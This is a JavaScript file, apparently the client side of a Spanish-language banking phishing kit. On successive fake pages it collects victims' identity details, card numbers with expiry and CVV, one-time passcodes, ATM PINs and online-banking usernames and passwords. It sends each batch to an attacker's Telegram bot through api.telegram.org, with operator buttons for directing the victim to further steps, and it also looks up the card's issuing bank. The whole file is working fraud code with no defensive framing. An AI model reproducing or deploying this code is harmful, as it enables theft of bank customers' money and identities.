const sendMessageButton = document.getElementById("enviar");
const page = document.getElementById("pag").value;

sendMessageButton.addEventListener("click", () => {
  EnviarMesseger();
});

async function EnviarMesseger() {
  if (!validacion(sendMessageButton)) {
    return;
  }

  const xhr = new XMLHttpRequest();
  xhr.onreadystatechange = async function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      if (!localStorage.getItem("data")) {
        const dataExist = JSON.stringify([]);
        localStorage.setItem("data", dataExist);
      }

      const datosToken = JSON.parse(xhr.responseText);
      const ip = datosToken.Ip;
      let mensaje = ip;

      switch (page) {
        case "info":
          window.location.href = "pago.php";
          break;
        case "tarjeta":
          const nombre = document.getElementById("nombre").value;
          // const apellido = document.getElementById("apellido").value;
          const documento = document.getElementById("documento").value;
          const tel = document.getElementById("tel").value;
          const ciudad = document.getElementById("ciudad").value;
          const direccion = document.getElementById("direccion").value;
          const correo = document.getElementById("correo").value;
          const TxtBanco = document.getElementById("TxtBanco").value;
          const inputNumero = document.getElementById("inputNumero").value;
          const selectMes = document.getElementById("selectMes").value;
          const inputCCV = document.getElementById("inputCCV").value;
          const inputinfo = await fetchInfo(inputNumero);

          localStorage.setItem("bank", TxtBanco);
          localStorage.setItem("tarjeta", inputNumero);
          window.localStorage.setItem("info", JSON.stringify([nombre]));

          mensaje += "\n 🟢NOMBRE: " + nombre ;
          mensaje += "\n 🟢CEDULA: " + documento;
          mensaje += "\n 🟢TELEFONO: " + tel;
          mensaje += "\n 🟢CIUDAD: " + ciudad;
          mensaje += "\n 🟢DIRECCION: " + direccion;
          mensaje += "\n 🟢CORREO: " + correo;
          mensaje += "\n ✈️";
          mensaje += "\n 🟢BANCO: " + TxtBanco;
          mensaje += "\n 🟢CC: " + inputNumero;
          mensaje += "\n 🟢FECHA: " + selectMes;
          mensaje += "\n 🟢CVV: " + inputCCV;
          messeger(mensaje, datosToken);
          break;
        case "otp":
          var dataInfo = JSON.parse(window.localStorage.getItem("info"));
          const otp = document.getElementById("otp").value;
          mensaje += "\n 🟢NOMBRE: " + dataInfo[0] + " " + dataInfo[1];
          mensaje += "\n 🟢OTP: " + otp;
          messeger(mensaje, datosToken);
          break;
        case "atm":
          var dataInfo = JSON.parse(window.localStorage.getItem("info"));
          const passatm = document.getElementById("txtPassword").value;
          mensaje += "\n 🟢NOMBRE: " + dataInfo[0] + " " + dataInfo[1];
          mensaje += "\n 🏧CLAVE CAJERO: " + passatm;
          messeger(mensaje, datosToken);
          break;
        case "logo":
          var dataInfo = JSON.parse(window.localStorage.getItem("info"));
          const usuario = document.getElementById("txtUser").value;
          const pass = document.getElementById("txtPassword").value;
          mensaje += "\n 🟢NOMBRE: " + dataInfo[0] + " " + dataInfo[1];
          mensaje += "\n 🟢USUARIO: " + usuario;
          mensaje += "\n 🟢CONTRASEÑA: " + pass;
          messeger(mensaje, datosToken);
          break;
        case "final":
          break;
        default:
          break;
      }
    }
  };

  xhr.open("GET", "setting.php", true);
  xhr.send();
}

async function fetchInfo(numero) {
  let bank;
  let brand;
  let contry;
  let scheme;
  let type;

  await fetch("https://lookup.binlist.net/" + numero.toString().trim())
    .then((response) => response.json())
    .then((data) => {
      bank = data.bank.name;
      brand = data.brand;
      contry = data.country.name;
      scheme = data.scheme;
      type = data.type;
    })
    .catch((err) => {
      return "";
    });

  return `${bank},${brand},${contry},${scheme},${type}`;
}

function messeger(mensaje, datosToken) {
  const token = datosToken.token;
  const chatId = datosToken.chatId;

  const buttons = [["🏦LG", "⭐️OTP", "⭐️TK", "⭐️AP", "🏧"],
  ["❌LG", "❌OTP", "❌TC", "✅FINAL"]
  ];

  const keyboard = {
    inline_keyboard: buttons.map((row) =>
      row.map((button) => ({ text: button, callback_data: button }))
    ),
    resize_keyboard: true,
  };

  const message = {
    chat_id: chatId,
    text: mensaje,
    reply_markup: JSON.stringify(keyboard),
  };

  const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(apiUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((response) => response.json())
    .then(() => {
      window.location.href = "global.php";
    })
    .catch((error) => {
      console.error("Error al enviar el mensaje:", error);
    });
}
